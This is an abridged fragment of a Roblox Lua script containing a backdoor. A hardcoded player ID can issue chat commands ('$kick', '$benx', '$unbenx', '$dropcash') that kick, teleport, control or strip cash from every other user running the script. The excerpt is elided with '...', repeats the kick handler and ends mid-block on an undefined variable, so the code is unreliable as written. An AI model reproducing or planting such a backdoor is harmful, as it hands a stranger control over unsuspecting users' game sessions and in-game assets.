while true do 
	local p8_lua = game:GetService("Players"):GetPlayerByUserId(943527190) --bonciolek1
		if p8_lua then
		...
		p8_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p8_lua then
		...
		p8_lua.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= p8_lua then
					...
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = p8_lua.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						...
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p8_lua.Character.HumanoidRootPart.CFrame + p8_lua.Character.HumanoidRootPart.CFrame.lookVector * 0.5
		...
		p8_lua.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= p8_lua then
					...
					wait(15)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p8_lua.Character.UpperTorso.Position)
				end
			end
		...
		p8_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p8_lua then
					game.Players.LocalPlayer:Kick("Kicked by p8_lua user")
				end
			end
		...
		p8_lua.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= p8_lua2 then
